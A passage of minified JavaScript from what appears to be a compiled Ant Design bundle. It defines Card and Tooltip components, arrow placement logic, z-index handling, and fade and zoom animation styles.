    `,transition:`all ${e.motionDurationMid}`,"&-hoverable:hover":{position:"relative",zIndex:1,boxShadow:o}}})(e),[`${t}-cover`]:{"> *":{display:"block",width:"100%",borderRadius:`${(0,S.unit)(e.borderRadiusLG)} ${(0,S.unit)(e.borderRadiusLG)} 0 0`}},[`${t}-actions`]:(e=>{let{componentCls:t,iconCls:r,actionsLiMargin:o,cardActionsIconSize:n,colorBorderSecondary:a,actionsBg:i}=e;return{margin:0,padding:0,listStyle:"none",background:i,borderTop:`${(0,S.unit)(e.lineWidth)} ${e.lineType} ${a}`,display:"flex",borderRadius:`0 0 ${(0,S.unit)(e.borderRadiusLG)} ${(0,S.unit)(e.borderRadiusLG)}`,...(0,ns.clearFix)(),"& > li":{margin:o,color:e.colorTextDescription,textAlign:"center","> span":{position:"relative",display:"block",minWidth:e.calc(e.cardActionsIconSize).mul(2).equal(),fontSize:e.fontSize,lineHeight:e.lineHeight,cursor:"pointer","&:hover":{color:e.colorPrimary,transition:`color ${e.motionDurationMid}`},[`a:not(${t}-btn), > ${r}`]:{display:"inline-block",width:"100%",color:e.colorIcon,lineHeight:(0,S.unit)(e.fontHeight),transition:`color ${e.motionDurationMid}`,"&:hover":{color:e.colorPrimary}},[`> ${r}`]:{fontSize:n,lineHeight:(0,S.unit)(e.calc(n).mul(e.lineHeight).equal())}},"&:not(:last-child)":{borderInlineEnd:`${(0,S.unit)(e.lineWidth)} ${e.lineType} ${a}`}}}})(e),[`${t}-meta`]:{margin:`${(0,S.unit)(e.calc(e.marginXXS).mul(-1).equal())} 0`,display:"flex",...(0,ns.clearFix)(),"&-avatar":{paddingInlineEnd:e.padding},"&-section":{overflow:"hidden",flex:1,"> div:not(:last-child)":{marginBottom:e.marginXS}},"&-title":{color:e.colorTextHeading,fontWeight:e.fontWeightStrong,fontSize:e.fontSizeLG,...ns.textEllipsis},"&-description":{color:e.colorTextDescription}}},[`${t}-bordered`]:{border:`${(0,S.unit)(e.lineWidth)} ${e.lineType} ${n}`,[`${t}-cover`]:{marginTop:-1,marginInlineStart:-1,marginInlineEnd:-1}},[`${t}-hoverable`]:{cursor:"pointer",transition:["box-shadow","border-color"].map(e=>`${e} ${l}`).join(", "),"&:hover":{borderColor:"transparent",boxShadow:r}},[`${t}-contain-grid`]:{borderRadius:`${(0,S.unit)(e.borderRadiusLG)} ${(0,S.unit)(e.borderRadiusLG)} 0 0 `,[`&:not(:has(> ${t}-head))`]:{borderRadius:0},[`${t}-body`]:{display:"flex",flexWrap:"wrap"},[`&:not(${t}-loading) ${t}-body`]:{marginBlockStart:e.calc(e.lineWidth).mul(-1).equal(),marginInlineStart:e.calc(e.lineWidth).mul(-1).equal(),padding:0}},[`${t}-contain-tabs`]:{[`> div${t}-head`]:{minHeight:0,[`${t}-head-title, ${t}-extra`]:{paddingTop:o}}},[`${t}-type-inner`]:(e=>{let{componentCls:t,colorFillAlter:r,headerPadding:o,bodyPadding:n}=e;return{[`${t}-head`]:{padding:`0 ${(0,S.unit)(o)}`,background:r,"&-title":{fontSize:e.fontSize}},[`${t}-body`]:{padding:`${(0,S.unit)(e.padding)} ${(0,S.unit)(n)}`}}})(e),[`${t}-loading`]:(e=>{let{componentCls:t}=e;return{overflow:"hidden",[`${t}-body`]:{userSelect:"none"}}})(e),[`${t}-rtl`]:{direction:"rtl"}}})(t),(e=>{let{componentCls:t,bodyPaddingSM:r,headerPaddingSM:o,headerHeightSM:n,headerFontSizeSM:a}=e;return{[`${t}-small`]:{[`> ${t}-head`]:{minHeight:n,padding:`0 ${(0,S.unit)(o)}`,fontSize:a,[`> ${t}-head-wrapper`]:{[`> ${t}-extra`]:{fontSize:e.fontSize}}},[`> ${t}-body`]:{padding:r}},[`${t}-small${t}-contain-tabs`]:{[`> ${t}-head`]:{[`${t}-head-title, ${t}-extra`]:{paddingTop:0,display:"flex",alignItems:"center"}}}}})(t)]},e=>({headerBg:"transparent",headerFontSize:e.fontSizeLG,headerFontSizeSM:e.fontSize,headerHeight:e.fontSizeLG*e.lineHeightLG+2*e.padding,headerHeightSM:e.fontSize*e.lineHeight+2*e.paddingXS,actionsBg:e.colorBgContainer,actionsLiMargin:`${e.paddingSM}px 0`,tabsMarginBottom:-e.padding-e.lineWidth,extraColor:e.colorText,bodyPaddingSM:12,headerPaddingSM:12,bodyPadding:e.bodyPadding??e.paddingLG,headerPadding:e.headerPadding??e.paddingLG})),nS=e=>{let{actionClasses:t,actions:r=[],actionStyle:o}=e;return i.createElement("ul",{className:t,style:o},r.map((e,t)=>{let o=`action-${t}`;return i.createElement("li",{style:{width:`${100/r.length}%`},key:o},i.createElement("span",null,e))}))},nx=i.forwardRef((e,t)=>{let r,{prefixCls:o,className:n,rootClassName:a,style:u,extra:p,headStyle:m={},bodyStyle:f={},title:g,loading:h,bordered:v,variant:b,size:y,type:S,cover:x,actions:C,tabList:w,children:k,activeTabKey:P,defaultActiveTabKey:$,tabBarExtraContent:E,hoverable:T,tabProps:I={},classNames:R,styles:M,...A}=e,{getPrefixCls:D,direction:L,className:_,style:O,classNames:N,styles:V}=(0,c.useComponentConfig)("card"),[B]=tn("card",b,v),H=(0,F.default)(y),z={...e,size:H,variant:B,loading:h},[U,W]=(0,j.useMergeSemantic)([N,R],[V,M],{props:z}),q=i.useMemo(()=>(0,d.toArray)(k).some(e=>i.isValidElement(e)&&e.type===nb),[k]),G=D("card",o),[J,X]=ny(G),K=i.createElement(tS,{loading:!0,active:!0,paragraph:{rows:4},title:!1},k),Q=void 0!==P,Y={...I,[Q?"activeKey":"defaultActiveKey"]:Q?P:$,tabBarExtraContent:E},Z=w?i.createElement(nv,{size:"small"!==H?"large":H,...Y,className:`${G}-head-tabs`,onChange:t=>{e.onTabChange?.(t)},items:w.map(({tab:e,...t})=>({label:e,...t}))}):null;if(g||p||Z){let e=(0,l.clsx)(`${G}-head`,U.header),t=(0,l.clsx)(`${G}-head-title`,U.title),o=(0,l.clsx)(`${G}-extra`,U.extra),n={...m,...W.header};r=i.createElement("div",{className:e,style:n},i.createElement("div",{className:`${G}-head-wrapper`},g&&i.createElement("div",{className:t,style:W.title},g),p&&i.createElement("div",{className:o,style:W.extra},p)),Z)}let ee=(0,l.clsx)(`${G}-cover`,U.cover),et=x?i.createElement("div",{className:ee,style:W.cover},x):null,er=(0,l.clsx)(`${G}-body`,U.body),eo={...f,...W.body},en=i.createElement("div",{className:er,style:eo},h?K:k),ea=(0,l.clsx)(`${G}-actions`,U.actions),ei=C?.length?i.createElement(nS,{actionClasses:ea,actionStyle:W.actions,actions:C}):null,es=(0,s.omit)(A,["onTabChange"]),el=(0,l.clsx)(G,_,{[`${G}-loading`]:h,[`${G}-bordered`]:"borderless"!==B,[`${G}-hoverable`]:T,[`${G}-contain-grid`]:q,[`${G}-contain-tabs`]:w?.length,[`${G}-small`]:"small"===H,[`${G}-type-${S}`]:!!S,[`${G}-rtl`]:"rtl"===L},n,a,J,X,U.root),ec={...W.root,...O,...u};return i.createElement("div",{ref:t,...es,className:el,style:ec},r,et,en,ei)});nx.Grid=nb,nx.Meta=e=>{let{prefixCls:t,className:r,avatar:o,title:n,description:a,style:s,classNames:u,styles:d,...p}=e,{getPrefixCls:m,className:f,style:g,classNames:h,styles:v}=(0,c.useComponentConfig)("cardMeta"),b=m("card",t),y=`${b}-meta`,[S,x]=(0,j.useMergeSemantic)([h,u],[v,d],{props:e}),C=(0,l.clsx)(y,r,f,S.root),w={...g,...x.root,...s},k=(0,l.clsx)(`${y}-avatar`,S.avatar),P=(0,l.clsx)(`${y}-title`,S.title),$=(0,l.clsx)(`${y}-description`,S.description),E=(0,l.clsx)(`${y}-section`,S.section),T=o?i.createElement("div",{className:k,style:x.avatar},o):null,I=n?i.createElement("div",{className:P,style:x.title},n):null,R=a?i.createElement("div",{className:$,style:x.description},a):null,M=I||R?i.createElement("div",{className:E,style:x.section},I,R):null;return i.createElement("div",{...p,className:C,style:w},T,M)},e.s(["Card",0,nx],75712)},1361,14515,95220,37908,e=>{"use strict";e.i(47167);var t=e.i(71645);let r={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M257.7 752c2 0 4-.2 6-.5L431.9 722c2-.4 3.9-1.3 5.3-2.8l423.9-423.9a9.96 9.96 0 000-14.1L694.9 114.9c-1.9-1.9-4.4-2.9-7.1-2.9s-5.2 1-7.1 2.9L256.8 538.8c-1.5 1.5-2.4 3.3-2.8 5.3l-29.5 168.2a33.5 33.5 0 009.4 29.8c6.6 6.4 14.9 9.9 23.8 9.9zm67.4-174.4L687.8 215l73.3 73.3-362.7 362.6-88.9 15.7 15.6-89zM880 836H144c-17.7 0-32 14.3-32 32v36c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-36c0-17.7-14.3-32-32-32z"}}]},name:"edit",theme:"outlined"};var o=e.i(9583);function n(){return(n=Object.assign.bind()).apply(this,arguments)}let a=t.forwardRef((e,a)=>t.createElement(o.default,n({},e,{ref:a,icon:r})));e.s(["default",0,a],1361);var i=e.i(32044);let s=e=>{if((0,i.default)()&&window.document.documentElement){let t=Array.isArray(e)?e:[e],{documentElement:r}=window.document;return t.some(e=>e in r.style)}return!1};function l(e,t){if(!Array.isArray(e)&&void 0!==t){if(!s(e))return!1;let r=document.createElement("div"),o=r.style[e];return r.style[e]=t,r.style[e]!==o}return s(e)}e.s(["isStyleSupport",()=>l],14515);var c=e.i(7670);let u=e=>{let{children:r,prefixCls:o,id:n,classNames:a,styles:i,className:s,style:l}=e;return t.createElement("div",{id:n,className:(0,c.clsx)(`${o}-container`,a?.container,s),style:{...i?.container,...l},role:"tooltip"},"function"==typeof r?r():r)};e.s(["default",0,u],95220);var d=e.i(49637),p=e.i(87225);let m={shiftX:64,adjustY:1},f={adjustX:1,shiftY:!0},g=[0,0],h={left:{points:["cr","cl"],overflow:f,offset:[-4,0],targetOffset:g},right:{points:["cl","cr"],overflow:f,offset:[4,0],targetOffset:g},top:{points:["bc","tc"],overflow:m,offset:[0,-4],targetOffset:g},bottom:{points:["tc","bc"],overflow:m,offset:[0,4],targetOffset:g},topLeft:{points:["bl","tl"],overflow:m,offset:[0,-4],targetOffset:g},leftTop:{points:["tr","tl"],overflow:f,offset:[-4,0],targetOffset:g},topRight:{points:["br","tr"],overflow:m,offset:[0,-4],targetOffset:g},rightTop:{points:["tl","tr"],overflow:f,offset:[4,0],targetOffset:g},bottomRight:{points:["tr","br"],overflow:m,offset:[0,4],targetOffset:g},rightBottom:{points:["bl","br"],overflow:f,offset:[4,0],targetOffset:g},bottomLeft:{points:["tl","bl"],overflow:m,offset:[0,4],targetOffset:g},leftBottom:{points:["br","bl"],overflow:f,offset:[-4,0],targetOffset:g}};function v(){return(v=Object.assign.bind()).apply(this,arguments)}let b=t.forwardRef((e,r)=>{let{trigger:o=["hover"],mouseEnterDelay:n=0,mouseLeaveDelay:a=.1,prefixCls:i="rc-tooltip",children:s,onVisibleChange:l,afterVisibleChange:m,motion:f,placement:g="right",align:b={},destroyOnHidden:y=!1,defaultVisible:S,getTooltipContainer:x,arrowContent:C,overlay:w,id:k,showArrow:P=!0,classNames:$,styles:E,...T}=e,I=(0,p.default)(k),R=(0,t.useRef)(null);(0,t.useImperativeHandle)(r,()=>R.current);let M={...T};"visible"in e&&(M.popupVisible=e.visible);let A=t.useMemo(()=>{if(!P)return!1;let e=!0===P?{}:P;return{...e,className:(0,c.clsx)(e.className,$?.arrow),style:{...e.style,...E?.arrow},content:e.content??C}},[P,$?.arrow,E?.arrow,C]);return t.createElement(d.default,v({popupClassName:$?.root,prefixCls:i,popup:t.createElement(u,{key:"content",prefixCls:i,id:I,classNames:$,styles:E},w),action:o,builtinPlacements:h,popupPlacement:g,ref:R,popupAlign:b,getPopupContainer:x,onOpenChange:l,afterOpenChange:m,popupMotion:f,defaultPopupVisible:S,autoDestroy:y,mouseLeaveDelay:a,popupStyle:E?.root,mouseEnterDelay:n,arrow:A,uniqueContainerClassName:$?.uniqueContainer,uniqueContainerStyle:E?.uniqueContainer},M),({open:e})=>{let r=t.Children.only(s);return t.cloneElement(r,{"aria-describedby":w&&e?I:void 0})})});e.s(["default",0,b],37908)},17206,e=>{"use strict";var t=e.i(71645),r=e.i(62139),o=e.i(87166),n=e.i(76398);e.s(["default",0,e=>{let{space:a,form:i,children:s}=e;if(!(0,n.default)(s))return null;let l=s;return i&&(l=t.default.createElement(r.NoFormStyle,{override:!0,status:!0},l)),a&&(l=t.default.createElement(o.NoCompactStyle,null,l)),l}])},22767,40010,7358,20560,5984,47656,96158,92656,9656,17356,e=>{"use strict";e.i(47167);var t=e.i(71645),r=e.i(19581);let o=t.default.createContext(void 0);e.s(["default",0,o],40010);let n={Modal:100,Drawer:100,Popover:100,Popconfirm:100,Tooltip:100,Tour:100,FloatButton:100},a={SelectLike:50,Dropdown:50,DatePicker:50,Menu:50,ImagePreview:1};e.s(["useZIndex",0,(e,i)=>{let s,[,l]=(0,r.default)(),c=t.default.useContext(o),u=e in n;if(void 0!==i)s=[i,i];else{let t=c??0;u?t+=(c?0:l.zIndexPopupBase)+n[e]:t+=a[e],s=[void 0===c?i:t,t]}return s}],22767),e.i(96059);var i=e.i(15654),s=e.i(46422);function l(e){let{sizePopupArrow:t,borderRadiusXS:r,borderRadiusOuter:o}=e,n=t/2,a=o/Math.sqrt(2),i=n-o*(1-1/Math.sqrt(2)),s=n-1/Math.sqrt(2)*r,l=o*(Math.sqrt(2)-1)+1/Math.sqrt(2)*r,c=n*Math.sqrt(2)+o*(Math.sqrt(2)-2),u=o*(Math.sqrt(2)-1),d=`polygon(${u}px 100%, 50% ${u}px, ${2*n-u}px 100%, ${u}px 100%)`;return{arrowShadowWidth:c,arrowPath:`path('M 0 ${n} A ${o} ${o} 0 0 0 ${a} ${i} L ${s} ${l} A ${r} ${r} 0 0 1 ${2*n-s} ${l} L ${2*n-a} ${i} A ${o} ${o} 0 0 0 ${2*n-0} ${n} Z')`,arrowPolygon:d}}let c=(e,t,r)=>{let{sizePopupArrow:o,arrowPolygon:n,arrowPath:a,arrowShadowWidth:s,borderRadiusXS:l,calc:c}=e;return{pointerEvents:"none",width:o,height:o,overflow:"hidden","&::before":{position:"absolute",bottom:0,insetInlineStart:0,width:o,height:c(o).div(2).equal(),background:t,clipPath:{_multi_value_:!0,value:[n,a]},content:'""'},"&::after":{content:'""',position:"absolute",width:s,height:s,bottom:0,insetInline:0,margin:"auto",borderRadius:{_skip_check_:!0,value:`0 0 ${(0,i.unit)(l)} 0`},transform:"translateY(50%) rotate(-135deg)",boxShadow:r,zIndex:0,background:"transparent"}}};function u(e){let{contentRadius:t,limitVerticalRadius:r}=e,o=t>12?t+2:12;return{arrowOffsetHorizontal:o,arrowOffsetVertical:r?8:o}}e.s(["genRoundedArrow",0,c,"getArrowToken",()=>l],7358),e.s(["MAX_VERTICAL_CONTENT_RADIUS",0,8,"default",0,(e,t,r)=>{var o,n,a,l,u,d,p,m;let{componentCls:f,boxShadowPopoverArrow:g,arrowOffsetVertical:h,arrowOffsetHorizontal:v,antCls:b}=e,[y]=(0,s.genCssVar)(b,"tooltip"),{arrowDistance:S=0,arrowPlacement:x={left:!0,right:!0,top:!0,bottom:!0}}=r||{};return{[f]:{[`${f}-arrow`]:[{position:"absolute",zIndex:1,display:"block",...c(e,t,g),"&:before":{background:t}}],...(o=!!x.top,n={[`&-placement-top > ${f}-arrow,&-placement-topLeft > ${f}-arrow,&-placement-topRight > ${f}-arrow`]:{bottom:S,transform:"translateY(100%) rotate(180deg)"},[`&-placement-top > ${f}-arrow`]:{left:{_skip_check_:!0,value:"50%"},transform:"translateX(-50%) translateY(100%) rotate(180deg)"},"&-placement-topLeft":{[y("arrow-offset-x")]:v,[`> ${f}-arrow`]:{left:{_skip_check_:!0,value:v}}},"&-placement-topRight":{[y("arrow-offset-x")]:`calc(100% - ${(0,i.unit)(v)})`,[`> ${f}-arrow`]:{right:{_skip_check_:!0,value:v}}}},o?n:{}),...(a=!!x.bottom,l={[`&-placement-bottom > ${f}-arrow,&-placement-bottomLeft > ${f}-arrow,&-placement-bottomRight > ${f}-arrow`]:{top:S,transform:"translateY(-100%)"},[`&-placement-bottom > ${f}-arrow`]:{left:{_skip_check_:!0,value:"50%"},transform:"translateX(-50%) translateY(-100%)"},"&-placement-bottomLeft":{[y("arrow-offset-x")]:v,[`> ${f}-arrow`]:{left:{_skip_check_:!0,value:v}}},"&-placement-bottomRight":{[y("arrow-offset-x")]:`calc(100% - ${(0,i.unit)(v)})`,[`> ${f}-arrow`]:{right:{_skip_check_:!0,value:v}}}},a?l:{}),...(u=!!x.left,d={[`&-placement-left > ${f}-arrow,&-placement-leftTop > ${f}-arrow,&-placement-leftBottom > ${f}-arrow`]:{right:{_skip_check_:!0,value:S},transform:"translateX(100%) rotate(90deg)"},[`&-placement-left > ${f}-arrow`]:{top:{_skip_check_:!0,value:"50%"},transform:"translateY(-50%) translateX(100%) rotate(90deg)"},[`&-placement-leftTop > ${f}-arrow`]:{top:h},[`&-placement-leftBottom > ${f}-arrow`]:{bottom:h}},u?d:{}),...(p=!!x.right,m={[`&-placement-right > ${f}-arrow,&-placement-rightTop > ${f}-arrow,&-placement-rightBottom > ${f}-arrow`]:{left:{_skip_check_:!0,value:S},transform:"translateX(-100%) rotate(-90deg)"},[`&-placement-right > ${f}-arrow`]:{top:{_skip_check_:!0,value:"50%"},transform:"translateY(-50%) translateX(-100%) rotate(-90deg)"},[`&-placement-rightTop > ${f}-arrow`]:{top:h},[`&-placement-rightBottom > ${f}-arrow`]:{bottom:h}},p?m:{})}}},"getArrowOffsetToken",()=>u],20560);let d={left:{points:["cr","cl"]},right:{points:["cl","cr"]},top:{points:["bc","tc"]},bottom:{points:["tc","bc"]},topLeft:{points:["bl","tl"]},leftTop:{points:["tr","tl"]},topRight:{points:["br","tr"]},rightTop:{points:["tl","tr"]},bottomRight:{points:["tr","br"]},rightBottom:{points:["bl","br"]},bottomLeft:{points:["tl","bl"]},leftBottom:{points:["br","bl"]}},p={topLeft:{points:["bl","tc"]},leftTop:{points:["tr","cl"]},topRight:{points:["br","tc"]},rightTop:{points:["tl","cr"]},bottomRight:{points:["tr","bc"]},rightBottom:{points:["bl","cr"]},bottomLeft:{points:["tl","bc"]},leftBottom:{points:["br","cl"]}},m=new Set(["topLeft","topRight","bottomLeft","bottomRight","leftTop","leftBottom","rightTop","rightBottom"]);function f(e){let{arrowWidth:t,autoAdjustOverflow:r,arrowPointAtCenter:o,offset:n,borderRadius:a,visibleFirst:i}=e,s=t/2,l={},c=u({contentRadius:a,limitVerticalRadius:!0});return Object.keys(d).forEach(e=>{let a={...o&&p[e]||d[e],offset:[0,0],dynamicInset:!0};switch(l[e]=a,m.has(e)&&(a.autoArrow=!1),e){case"top":case"topLeft":case"topRight":a.offset[1]=-s-n;break;case"bottom":case"bottomLeft":case"bottomRight":a.offset[1]=s+n;break;case"left":case"leftTop":case"leftBottom":a.offset[0]=-s-n;break;case"right":case"rightTop":case"rightBottom":a.offset[0]=s+n}if(o)switch(e){case"topLeft":case"bottomLeft":a.offset[0]=-c.arrowOffsetHorizontal-s;break;case"topRight":case"bottomRight":a.offset[0]=c.arrowOffsetHorizontal+s;break;case"leftTop":case"rightTop":a.offset[1]=-(2*c.arrowOffsetHorizontal)+s;break;case"leftBottom":case"rightBottom":a.offset[1]=2*c.arrowOffsetHorizontal-s}a.overflow=function(e,t,r,o){if(!1===o)return{adjustX:!1,adjustY:!1};let n={};switch(e){case"top":case"bottom":n.shiftX=2*t.arrowOffsetHorizontal+r,n.shiftY=!0,n.adjustY=!0;break;case"left":case"right":n.shiftY=2*t.arrowOffsetVertical+r,n.shiftX=!0,n.adjustX=!0}let a={...n,...o&&"object"==typeof o?o:{}};return a.shiftX||(a.adjustX=!0),a.shiftY||(a.adjustY=!0),a}(e,c,t,r),i&&(a.htmlRegion="visibleFirst")}),l}e.s(["default",()=>f],5984),e.i(63335);var g=e.i(24308),g=g;function h(){}let{resetWarned:v}=g.default,b=t.createContext({});e.s(["WarningContext",0,b,"devUseWarning",0,()=>{let e=()=>{};return e.deprecated=h,e}],47656),e.s(["default",0,(e,r)=>{let o=e=>"boolean"==typeof e?{show:e}:e||{};return t.default.useMemo(()=>{let t=o(e),n=o(r);return{...n,...t,show:t.show??n.show??!0}},[e,r])}],96158);var y=e.i(95220);e.s(["Popup",()=>y.default],92656);var S=e.i(94758),x=e.i(2366);let C=new S.Keyframes("antFadeIn",{"0%":{opacity:0},"100%":{opacity:1}}),w=new S.Keyframes("antFadeOut",{"0%":{opacity:1},"100%":{opacity:0}});e.s(["initFadeMotion",0,(e,t=!1)=>{let{antCls:r}=e,o=`${r}-fade`,n=t?"&":"";return[(0,x.initMotion)(o,C,w,e.motionDurationMid,t),{[`
        ${n}${o}-enter,
        ${n}${o}-appear
      `]:{opacity:0,animationTimingFunction:"linear"},[`${n}${o}-leave`]:{animationTimingFunction:"linear"}}]}],9656);let k=new S.Keyframes("antZoomIn",{"0%":{transform:"scale(0.2)",opacity:0},"100%":{transform:"scale(1)",opacity:1}}),P=new S.Keyframes("antZoomOut",{"0%":{transform:"scale(1)"},"100%":{transform:"scale(0.2)",opacity:0}}),$=new S.Keyframes("antZoomBigIn",{"0%":{transform:"scale(0.8)",opacity:0},"100%":{transform:"scale(1)",opacity:1}}),E=new S.Keyframes("antZoomBigOut",{"0%":{transform:"scale(1)"},"100%":{transform:"scale(0.8)",opacity:0}}),T=new S.Keyframes("antZoomUpIn",{"0%":{transform:"scale(0.8)",transformOrigin:"50% 0%",opacity:0},"100%":{transform:"scale(1)",transformOrigin:"50% 0%"}}),I=new S.Keyframes("antZoomUpOut",{"0%":{transform:"scale(1)",transformOrigin:"50% 0%"},"100%":{transform:"scale(0.8)",transformOrigin:"50% 0%",opacity:0}}),R={zoom:{inKeyframes:k,outKeyframes:P},"zoom-big":{inKeyframes:$,outKeyframes:E},"zoom-big-fast":{inKeyframes:$,outKeyframes:E},"zoom-left":{inKeyframes:new S.Keyframes("antZoomLeftIn",{"0%":{transform:"scale(0.8)",transformOrigin:"0% 50%",opacity:0},"100%":{transform:"scale(1)",transformOrigin:"0% 50%"}}),outKeyframes:new S.Keyframes("antZoomLeftOut",{"0%":{transform:"scale(1)",transformOrigin:"0% 50%"},"100%":{transform:"scale(0.8)",transformOrigin:"0% 50%",opacity:0}})},"zoom-right":{inKeyframes:new S.Keyframes("antZoomRightIn",{"0%":{transform:"scale(0.8)",transformOrigin:"100% 50%",opacity:0},"100%":{transform:"scale(1)",transformOrigin:"100% 50%"}}),outKeyframes:new S.Keyframes("antZoomRightOut",{"0%":{transform:"scale(1)",transformOrigin:"100% 50%"},"100%":{transform:"scale(0.8)",transformOrigin:"100% 50%",opacity:0}})},"zoom-up":{inKeyframes:T,outKeyframes:I},"zoom-down":{inKeyframes:new S.Keyframes("antZoomDownIn",{"0%":{transform:"scale(0.8)",transformOrigin:"50% 100%",opacity:0},"100%":{transform:"scale(1)",transformOrigin:"50% 100%"}}),outKeyframes:new S.Keyframes("antZoomDownOut",{"0%":{transform:"scale(1)",transformOrigin:"50% 100%"},"100%":{transform:"scale(0.8)",transformOrigin:"50% 100%",opacity:0}})}};e.s(["initZoomMotion",0,(e,t)=>{let{antCls:r}=e,o=`${r}-${t}`,{inKeyframes:n,outKeyframes:a}=R[t];return[(0,x.initMotion)(o,n,a,"zoom-big-fast"===t?e.motionDurationFast:e.motionDurationMid),{[`
        ${o}-enter,
        ${o}-appear
      `]:{transform:"scale(0)",opacity:0,animationTimingFunction:e.motionEaseOutCirc,"&-prepare":{transform:"none"}},[`${o}-leave`]:{animationTimingFunction:e.motionEaseInOutCirc}}]}],17356)},3541,e=>{"use strict";var t=e.i(17933);function r(e,r){return t.PresetColors.reduce((t,o)=>{let n=e[`${o}1`],a=e[`${o}3`],i=e[`${o}6`],s=e[`${o}7`];return{...t,...r(o,{lightColor:n,lightBorderColor:a,darkColor:i,textColor:s})}},{})}e.s(["genPresetColor",()=>r],3541)},40270,e=>{"use strict";e.i(96059);var t=e.i(15654),r=e.i(83293),o=e.i(9656),n=e.i(17356),a=e.i(20560),i=e.i(7358),s=e.i(3541),l=e.i(46422),c=e.i(38378);let u=e=>({zIndexPopup:e.zIndexPopupBase+70,maxWidth:250,...(0,a.getArrowOffsetToken)({contentRadius:e.borderRadius,limitVerticalRadius:!0}),...(0,i.getArrowToken)((0,c.mergeToken)(e,{borderRadiusOuter:Math.min(e.borderRadiusOuter,4)}))});e.s(["default",0,(e,i,d=!0)=>(0,l.genStyleHooks)("Tooltip",e=>{let{borderRadius:i,colorTextLightSolid:u,colorBgSpotlight:d,maxWidth:p}=e;return[(e=>{let{calc:n,componentCls:i,tooltipMaxWidth:c,tooltipColor:u,tooltipBg:d,tooltipBorderRadius:p,zIndexPopup:m,controlHeight:f,boxShadowSecondary:g,paddingSM:h,paddingXS:v,arrowOffsetHorizontal:b,sizePopupArrow:y,antCls:S}=e,[x,C]=(0,l.genCssVar)(S,"tooltip"),w=n(p).add(y).add(b).equal(),k={minWidth:n(p).mul(2).add(y).equal(),minHeight:f,padding:`${(0,t.unit)(e.calc(h).div(2).equal())} ${(0,t.unit)(v)}`,color:C("overlay-color",u),textAlign:"start",textDecoration:"none",wordWrap:"break-word",backgroundColor:d,borderRadius:p,boxShadow:g,boxSizing:"border-box"},P={[x("valid-offset-x")]:C("arrow-offset-x","var(--arrow-x)"),transformOrigin:[C("valid-offset-x","50%"),"var(--arrow-y, 50%)"].join(" ")};return[{[i]:{...(0,r.resetComponent)(e),position:"absolute",zIndex:m,display:"block",width:"max-content",maxWidth:c,visibility:"visible",...P,"&-hidden":{display:"none"},[x("arrow-background-color")]:d,[`${i}-container`]:[k,(0,o.initFadeMotion)(e,!0)],[`&:has(~ ${i}-unique-container)`]:{[`${i}-container`]:{border:"none",background:"transparent",boxShadow:"none"}},"&-placement-topLeft,&-placement-topRight,&-placement-bottomLeft,&-placement-bottomRight":{minWidth:w},"&-placement-left,&-placement-leftTop,&-placement-leftBottom,&-placement-right,&-placement-rightTop,&-placement-rightBottom":{[`${i}-inner`]:{borderRadius:e.min(p,a.MAX_VERTICAL_CONTENT_RADIUS)}},[`${i}-content`]:{position:"relative"},...(0,s.genPresetColor)(e,(e,{darkColor:t})=>({[`&${i}-${e}`]:{[`${i}-container`]:{backgroundColor:t},[`${i}-arrow`]:{[x("arrow-background-color")]:t}}})),"&-rtl":{direction:"rtl"}}},(0,a.default)(e,C("arrow-background-color")),{[`${i}-pure`]:{position:"relative",maxWidth:"none",margin:e.sizePopupArrow}},{[`${i}-unique-container`]:{...k,...P,position:"absolute",zIndex:n(m).sub(1).equal(),"&-hidden":{display:"none"},"&-visible":{transition:`all ${e.motionDurationSlow}`}}}]})((0,c.mergeToken)(e,{tooltipMaxWidth:p,tooltipColor:u,tooltipBorderRadius:i,tooltipBg:d})),(0,n.initZoomMotion)(e,"zoom-big-fast")]},u,{resetStyle:!1,injectStyle:d})(e,i)])},2779,e=>{"use strict";var t=e.i(8211),r=e.i(17933);let o=r.PresetColors.map(e=>`${e}-inverse`),n=["success","processing","error","default","warning"];function a(e,n=!0){return n?[].concat((0,t.default)(o),(0,t.default)(r.PresetColors)).includes(e):r.PresetColors.includes(e)}function i(e){return n.includes(e)}e.s(["isPresetColor",()=>a,"isPresetStatusColor",()=>i])},91816,53996,11223,e=>{"use strict";e.i(47167);var t=e.i(71645),r=e.i(37908);e.i(63335);var o=e.i(30294),n=e.i(7670),a=e.i(17206),i=e.i(11517),s=e.i(22767),l=e.i(13541),c=e.i(5984),u=e.i(63731),d=e.i(47656),p=e.i(40010),m=e.i(42064),f=e.i(21883),g=e.i(4458),h=e.i(96158),v=e.i(92656),b=e.i(40270),y=e.i(2779),S=e.i(56449),x=e.i(46422);let C=(e,t,r)=>{let o=(0,y.isPresetColor)(r),[a]=(0,x.genCssVar)(e,"tooltip"),i=(0,n.clsx)({[`${t}-${r}`]:r&&o}),s={},l={},c=(0,S.generateColor)(r).toRgb(),u=(.299*c.r+.587*c.g+.114*c.b)/255;return r&&!o&&(s.background=r,s[a("overlay-color")]=u<.5?"#FFF":"#000",l[a("arrow-background-color")]=r),{className:i,overlayStyle:s,arrowStyle:l}};e.i(49637);var w=e.i(42569),w=w,k=e.i(28473);let P=({children:e})=>{let{getPrefixCls:r}=t.default.useContext(m.ConfigContext),o=r();return t.default.isValidElement(e)?t.default.createElement(k.default,{visible:!0,motionName:`${o}-fade`,motionAppear:!0,motionEnter:!0,motionLeave:!1,removeOnLeave:!1},({style:t,className:r})=>(0,u.cloneElement)(e,e=>({className:(0,n.clsx)(e.className,r),style:{...e.style,...t}}))):e},$=[null,null],E=({children:e})=>t.default.createElement(w.default,{postTriggerProps:e=>{let{id:r,builtinPlacements:o,popup:n}=e,a="function"==typeof n?n():n,i=function(e){if($[0]!==e){let t={};Object.keys(e).forEach(r=>{t[r]={...e[r],dynamicInset:!1}}),$[0]=e,$[1]=t}return $[1]}(o);return{...e,getPopupContainer:null,arrow:!1,popup:t.default.createElement(P,{key:r},a),builtinPlacements:i}}},e);e.s(["default",0,E],53996);let 